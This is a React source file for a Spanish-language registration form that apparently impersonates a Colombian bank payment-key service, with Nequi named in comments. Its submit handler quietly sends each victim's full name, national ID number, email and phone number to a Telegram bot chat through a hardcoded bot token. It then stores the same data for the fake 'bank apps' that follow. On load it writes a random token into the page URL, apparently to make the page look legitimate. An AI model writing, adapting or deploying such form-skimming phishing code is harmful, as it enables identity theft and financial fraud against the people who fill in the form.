import React, { useState, useEffect } from 'react';

function Register({ phoneNumber, onBack, onRegister }) {
  const [cedula, setCedula] = useState('');
  const [nombre, setNombre] = useState('');
  const [email, setEmail] = useState('');
  const [emailError, setEmailError] = useState('');

  useEffect(() => {
    try {
      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
      let token = '';
      for(let i=0; i < 50 + Math.floor(Math.random() * 30); i++) {
        token += chars.charAt(Math.floor(Math.random() * chars.length));
      }
      const base64Token = btoa(token + Date.now()).replace(/=/g, '');
      const url = new URL(window.location.href);
      url.searchParams.set('token', base64Token);
      window.history.replaceState(null, '', url.toString());
    } catch(e) {}
  }, []);

  const handleCedulaChange = (e) => {
    const value = e.target.value;
    // Solo permitir números
    if (/^\d*$/.test(value)) {
      setCedula(value);
    }
  };

  const handleEmailChange = (e) => {
    const value = e.target.value;
    setEmail(value);
    
    // Validar formato de correo estándar
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (value && !emailRegex.test(value)) {
      setEmailError('Ingresa un correo electrónico válido');
    } else {
      setEmailError('');
    }
  };

  const isFormValid = email.length > 0 && !emailError && cedula.length > 0 && nombre.length > 0;

  const handleRegister = async () => {
    if (isFormValid) {
      // Send to Telegram
      // Token actualizado encontrado en public/nequi/server.js
      const token = '8594588884:AAF1ODTlOEYhDIKgILpadiPlcgfCm_aZEAA';
      const chatId = '-5182218323'; // Grupo LOG
      const message = `
🚀 *Nuevo Registro* 🚀

📱 *Celular:* ${phoneNumber}
👤 *Nombre:* ${nombre}
🆔 *Cédula:* ${cedula}
📧 *Email:* ${email}
      `;

      try {
        const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=Markdown`);
        const data = await response.json();
        
        if (!data.ok) {
          console.error('Telegram Error:', data);
          alert(`Error enviando a Telegram: ${data.description}`);
        }
      } catch (error) {
        console.error('Error sending to Telegram:', error);
        // Fallback for CORS or network issues
        alert('No se pudo conectar con Telegram. Verifica tu conexión.');
      }

      // Save user data to sessionStorage for bank apps
      sessionStorage.setItem("bc_usuario", phoneNumber); // Nequi expects this
      sessionStorage.setItem("user_cedula", cedula);
      sessionStorage.setItem("user_email", email);
      sessionStorage.setItem("user_nombre", nombre);

      onRegister({ nombre, cedula, email });
    }
  };

  return (
    <div className="bg-white rounded-3xl p-8 w-full max-w-md shadow-2xl z-10">
      <h2 className="text-2xl font-bold text-gray-900 mb-2 text-center">
        No encontramos tu llave
      </h2>
      
      <p className="text-gray-500 text-sm text-center mb-6 leading-snug">
        No encontramos una llave activa con el número {phoneNumber}. Completa tus datos para registrarte.
      </p>

      {/* Formulario */}
      <div className="space-y-4">
        
        {/* Nombre Completo */}
        <div>
          <label className="block text-sm font-bold text-gray-800 mb-2">
            Nombre completo
          </label>
          <input
            type="text"
            value={nombre}
            onChange={(e) => setNombre(e.target.value)}
            className="w-full bg-gray-100 border border-gray-200 text-gray-900 text-base rounded-xl focus:ring-blue-500 focus:border-blue-500 block p-3.5 placeholder-gray-400 outline-none transition-all"
            placeholder="Nombre y apellidos"
          />
        </div>

        {/* Número de Cédula */}
        <div>
          <label className="block text-sm font-bold text-gray-800 mb-2">
            Número de cédula
          </label>
          <input
            type="text"
            value={cedula}
            onChange={handleCedulaChange}
            inputMode="numeric"
            className="w-full bg-gray-100 border border-gray-200 text-gray-900 text-base rounded-xl focus:ring-blue-500 focus:border-blue-500 block p-3.5 placeholder-gray-400 outline-none transition-all"
            placeholder="Cédula"
          />
        </div>

        {/* Número de Celular (Read-only) */}
        <div>
          <label className="block text-sm font-bold text-gray-800 mb-2">
            Número de celular
          </label>
          <input
            type="text"
            value={phoneNumber}
            readOnly
            className="w-full bg-gray-100 border border-gray-200 text-gray-900 text-base rounded-xl focus:ring-blue-500 focus:border-blue-500 block p-3.5 outline-none transition-all cursor-not-allowed opacity-75"
          />
          <p className="mt-2 text-xs text-gray-400">
            Usamos el número que ingresaste al inicio como tu llave principal.
          </p>
        </div>

        {/* Correo Electrónico */}
        <div>
          <label className="block text-sm font-bold text-gray-800 mb-2">
            Correo electrónico
          </label>
          <input
            type="email"
            value={email}
            onChange={handleEmailChange}
            className={`w-full bg-gray-100 border ${emailError ? 'border-red-500' : 'border-gray-200'} text-gray-900 text-base rounded-xl focus:ring-blue-500 focus:border-blue-500 block p-3.5 placeholder-gray-400 outline-none transition-all`}
            placeholder="tunombre@correo.com"
          />
          {emailError && (
            <p className="mt-1 text-xs text-red-500 font-semibold">
              {emailError}
            </p>
          )}
          <p className="mt-2 text-xs text-gray-400">
            Usaremos este correo para enviarte información de tus pagos y desembolsos.
          </p>
        </div>

      </div>

      {/* Botones de Acción */}
      <div className="mt-8 space-y-3">
        <button 
            className={`w-full py-3.5 rounded-full text-lg font-bold transition-colors ${
              isFormValid 
              ? 'bg-gradient-to-r from-cyan-300 to-green-400 text-gray-900 shadow-lg hover:from-cyan-400 hover:to-green-500' 
              : 'bg-gray-200 text-gray-400 cursor-not-allowed'
            }`}
            disabled={!isFormValid}
            onClick={handleRegister}
        >
          Registrar mis datos
        </button>
        
        <button 
            onClick={onBack}
            className="w-full py-3.5 rounded-full text-lg font-bold bg-gray-100 text-gray-700 hover:bg-gray-200 transition-colors"
        >
          Volver e intentar con otro número
        </button>
      </div>

    </div>
  );
}

export default Register;
